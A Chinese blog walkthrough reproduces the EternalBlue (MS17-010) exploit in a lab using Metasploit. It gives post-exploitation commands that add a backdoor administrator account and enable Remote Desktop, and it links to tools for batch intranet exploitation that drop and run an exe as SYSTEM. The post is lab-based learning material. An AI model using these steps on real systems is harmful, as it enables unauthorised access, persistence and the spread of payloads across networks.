---
title: "永恒之蓝-ETERNALBLUE漏洞MS17-010利用过程"
categories: ["安全技术"]
tags: ["exp", "漏洞利用", "MSF", "Kali"]
draft: false
slug: "22"
date: "2019-02-13 18:26:00"
---

# 事情起因

虽然距离上一次 WannaCry 席卷全球(17-05-12)已经过去一年多了，现在来复现有炒冷饭的嫌疑，但是还是有价值的

参考文章：

- http://blog.51cto.com/chenxinjie/2092754
- https://www.freebuf.com/articles/system/133853.html

# 环境准备

- Kali：192.168.2.6
- Win7_SP1:192.168.2.7：默认为 Administrator 账户无密码
- WinXP_SP3：192.168.2.4

# 使用 metasploit

## 搜索模块

使用 metasploit 来进行扫描和攻击，我们先看一下关于 ms17_010 的模块有哪些：

![][1]

扫描模块用

```
auxiliary/admin/smb/ms17_010_command

或者使用这个

auxiliary/scanner/smb/smb_ms17_010
```

攻击模块我们使用`exploit/windows/smb/ms17_010_eternalblue`

## 使用扫描模块进行扫描

`auxiliary/admin/smb/ms17_010_command`

![][2]

可以看到 winxp 扫描成功了，win7 没有扫描到，我们换另一个扫描模块：

`auxiliary/scanner/smb/smb_ms17_010`

![][3]

可以看到这个模块两个靶机它都认为可以攻击

## 使用攻击模块进行攻击

`exploit/windows/smb/ms17_010_eternalblue`

![][4]

开了防火墙的情况下是攻击不了的，关掉就可以攻击了。

## 对靶机进行控制

此处补充一下哪下 shell 中文显示乱码的问题：

输入`chcp 65001`即可

![][5]

### 创建用户并添加到管理员组

```
net user soapffz adminpasswd /add
net localgroup administrators soapffz /add
```

![][6]

### 开启远程桌面功能

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

关闭时使用如下语句：

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f
```

![][7]

### 远程桌面连接

![][8]

如果你的电脑是登陆了其他账户的话，这个远程桌面窗口会一直等待 20 秒左右，这边没有反应的话就会把管理员账户挤下去，就进桌面了：

![][9]

# Windows 下的检测&&攻击工具

## EternalBlues 批量检测工具

下载连接：http://omerez.com/repository/EternalBlues.exe

可以批量检测当前电脑所在局域网内的主机是否存在 ms17_010 漏洞(速度较快)：

![][10]

## MS_17_010_Scanv2.1 检测工具

下载链接：https://www.lanzous.com/i359xch

速度较慢：

![][11]

## cping 批量检测工具(19-02-23 更新)

介绍及使用参考文章：[内网 - 扫描存活主机][12]

## k8 加强版 zzz 攻击工具(19-02-23 更新)

内网批量 MS17-010 溢出工具，出自 k8 团队：https://www.cnblogs.com/k8gege/p/10391101.html

以下教程搬运自 k8：

```
工具:k8加强版zzz

编译:python

漏洞:MS17-010

用法:

zzz_exploit.exe 192.11.22.82
zzz_exploit.exe 192.11.22.82 exe参数
zzz_exploit.exe 192.11.22.82 exe参数 管道名

如exe启动参数为  m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start

内网批量

可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）

因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat

溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。
```

我们先试一下不带 exe 程序执行的效果：

![][13]

然后我们把一个经典的 IP 雷达工具按照教程所示改名为 ma.dat 放到文件夹中：

![][14]

然后再试一下：

![][15]

可以看到上传我们的 IP 雷达 exe 到了`C:\WINDOWS\Temp\msupdate.exe`，但是我们这不是一个马子所以启动服务失败了：

![][16]

大概用法就是这样

[1]: https://img.soapffz.com/archives_img/2019/02/13/archives_20190213_184325.png
[2]: https://img.soapffz.com/archives_img/2019/02/13/archives_20190213_194652.png
[3]: https://img.soapffz.com/archives_img/2019/02/13/archives_20190213_194827.png
[4]: https://img.soapffz.com/archives_img/2019/02/13/archives_20190213_211019.png
[5]: https://img.soapffz.com/archives_img/2019/02/13/archives_20190213_213426.png
[6]: https://img.soapffz.com/archives_img/2019/02/13/archives_20190213_211754.png
[7]: https://img.soapffz.com/archives_img/2019/02/13/archives_20190213_212202.png
[8]: https://img.soapffz.com/archives_img/2019/02/13/archives_20190213_212447.png
[9]: https://img.soapffz.com/archives_img/2019/02/13/archives_20190213_212727.png
[10]: https://img.soapffz.com/archives_img/2019/02/13/archives_20190213_213852.png
[11]: https://img.soapffz.com/archives_img/2019/02/13/archives_20190215_103452.png
[12]: https://www.soapffz.com/sec/116.html#menu_index_35=true
[13]: https://img.soapffz.com/archives_img/2019/02/23/archives_20190224_210224.png
[14]: https://img.soapffz.com/archives_img/2019/02/23/archives_20190224_210417.png
[15]: https://img.soapffz.com/archives_img/2019/02/23/archives_20190224_210618.png
[16]: https://img.soapffz.com/archives_img/2019/02/23/archives_20190224_210802.png
